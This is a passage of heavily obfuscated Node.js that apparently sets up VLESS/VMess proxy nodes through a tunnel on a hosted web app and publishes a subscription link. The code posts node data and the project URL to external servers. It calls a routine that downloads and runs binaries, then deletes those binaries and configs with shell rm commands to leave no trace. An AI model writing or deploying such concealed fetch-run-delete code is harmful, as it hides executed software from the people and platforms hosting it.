_0x5e4091={_0x788b6a:0x239,_0x48ead2:0x2a8,_0x3dec00:0x21c},_0x35ad4a=_0x2d49,_0x63f934={'v':'2','ps':''+_0x8b5106,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x35ad4a(_0x3564f7._0x382909),'net':'ws','type':_0x35ad4a(0x279),'host':_0x1e8e6d,'path':'/vmess-argo?ed=2560','tls':_0x35ad4a(_0x3564f7._0x391ad1),'sni':_0x1e8e6d,'alpn':'','fp':_0x35ad4a(0x270)},_0x229e02='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x35ad4a(_0x3564f7._0x29e62d)+_0x1e8e6d+_0x35ad4a(_0x3564f7._0x358022)+_0x1e8e6d+_0x35ad4a(_0x3564f7._0x33189b)+_0x8b5106+'\x0a\x0avmess://'+Buffer['from'](JSON[_0x35ad4a(0x1ed)](_0x63f934))['toString'](_0x35ad4a(0x225))+_0x35ad4a(_0x3564f7._0x5c3082)+UUID+'@'+CFIP+':'+CFPORT+_0x35ad4a(_0x3564f7._0xb23875)+_0x1e8e6d+_0x35ad4a(_0x3564f7._0x358022)+_0x1e8e6d+_0x35ad4a(0x23e)+_0x8b5106+_0x35ad4a(0x246);console[_0x35ad4a(0x1f2)](Buffer[_0x35ad4a(0x261)](_0x229e02)['toString']('base64')),fs[_0x35ad4a(0x26d)](subPath,Buffer[_0x35ad4a(0x261)](_0x229e02)['toString'](_0x35ad4a(_0x3564f7._0x1d319c))),console[_0x35ad4a(0x1f2)](FILE_PATH+_0x35ad4a(0x257)),uploadNodes(),app[_0x35ad4a(0x23b)]('/'+SUB_PATH,(_0x1c2592,_0x2f187c)=>{const _0xc1f3d1=_0x35ad4a,_0x10dd8a=Buffer['from'](_0x229e02)[_0xc1f3d1(0x284)](_0xc1f3d1(0x225));_0x2f187c['set'](_0xc1f3d1(_0x5e4091._0x788b6a),_0xc1f3d1(_0x5e4091._0x48ead2)),_0x2f187c[_0xc1f3d1(_0x5e4091._0x3dec00)](_0x10dd8a);}),_0x2dbff4(_0x229e02);},0x7d0);});}}async function uploadNodes(){const _0x120fdc={_0x4950e9:0x297,_0x1245a1:0x2a4,_0x2938c3:0x1ed,_0x53be7e:0x295,_0x4404f4:0x1e9,_0x22cb43:0x247},_0x77072f=_0x572a93;if(UPLOAD_URL&&PROJECT_URL){const _0x37ab9c=PROJECT_URL+'/'+SUB_PATH,_0x38e0a8={'subscription':[_0x37ab9c]};try{const _0xfbe8e3=await axios['post'](UPLOAD_URL+_0x77072f(0x1f9),_0x38e0a8,{'headers':{'Content-Type':_0x77072f(0x1e9)}});return _0xfbe8e3&&_0xfbe8e3[_0x77072f(0x247)]===0xc8?(console['log'](_0x77072f(_0x120fdc._0x4950e9)),_0xfbe8e3):null;}catch(_0x23d39d){if(_0x23d39d[_0x77072f(_0x120fdc._0x1245a1)]){if(_0x23d39d[_0x77072f(_0x120fdc._0x1245a1)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x77072f(0x22c)](listPath))return;const _0x3b84d3=fs[_0x77072f(0x28b)](listPath,_0x77072f(0x272)),_0x4fc52f=_0x3b84d3['split']('\x0a')[_0x77072f(0x211)](_0x5065c5=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x5065c5));if(_0x4fc52f[_0x77072f(0x273)]===0x0)return;const _0x3a1b33=JSON[_0x77072f(_0x120fdc._0x2938c3)]({'nodes':_0x4fc52f});try{const _0x5bca4f=await axios[_0x77072f(0x298)](UPLOAD_URL+_0x77072f(_0x120fdc._0x53be7e),_0x3a1b33,{'headers':{'Content-Type':_0x77072f(_0x120fdc._0x4404f4)}});return _0x5bca4f&&_0x5bca4f[_0x77072f(_0x120fdc._0x22cb43)]===0xc8?(console[_0x77072f(0x1f2)](_0x77072f(0x238)),_0x5bca4f):null;}catch(_0xc2763b){return null;}}else return;}}function cleanFiles(){const _0x4547e5={_0x68060f:0x268},_0x2fef77={_0x3c3a3a:0x2a9,_0x192a9c:0x1f2},_0x3349f6={_0x2ca9c5:0x207,_0x410ba1:0x1f2,_0x1ad5d8:0x2a9};setTimeout(()=>{const _0x36191b=_0x2d49,_0x306cea=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x306cea[_0x36191b(0x21d)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x306cea[_0x36191b(0x21d)](phpPath);process[_0x36191b(_0x4547e5._0x68060f)]===_0x36191b(0x24d)?exec(_0x36191b(0x22b)+_0x306cea[_0x36191b(0x1e8)]('\x20')+_0x36191b(0x20a),_0x587974=>{const _0x356f4b=_0x36191b;console[_0x356f4b(_0x3349f6._0x2ca9c5)](),console[_0x356f4b(_0x3349f6._0x410ba1)](_0x356f4b(_0x3349f6._0x1ad5d8)),console[_0x356f4b(_0x3349f6._0x410ba1)](_0x356f4b(0x2a5));}):exec(_0x36191b(0x217)+_0x306cea['join']('\x20')+_0x36191b(0x274),_0x53f0f7=>{const _0x56c8ee=_0x36191b;console[_0x56c8ee(0x207)](),console['log'](_0x56c8ee(_0x2fef77._0x3c3a3a)),console[_0x56c8ee(_0x2fef77._0x192a9c)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x4ca815={_0x23f8a2:0x1fb},_0x29c598=_0x572a93;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x29c598(0x25f));return;}try{const _0x750ff9=await axios['post']('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console[_0x29c598(0x1f2)](_0x29c598(_0x4ca815._0x23f8a2)),_0x750ff9;}catch(_0x1b11af){return console[_0x29c598(0x23f)](_0x29c598(0x234)+_0x1b11af['message']),null;}}async function startserver(){const _0x384bba={_0x2715ac:0x23f,_0x2fe69e:0x260},_0x787ff=_0x572a93;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x32e330){console[_0x787ff(_0x384bba._0x2715ac)](_0x787ff(_0x384bba._0x2fe69e),_0x32e330);}}startserver()[_0x572a93(0x25b)](_0x2d8b5b=>{const _0x5f3241={_0x357ef4:0x1eb},_0x3aff3d=_0x572a93;console['error'](_0x3aff3d(_0x5f3241._0x357ef4),_0x2d8b5b);}),app[_0x572a93(0x263)](PORT,()=>console[_0x572a93(0x1f2)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
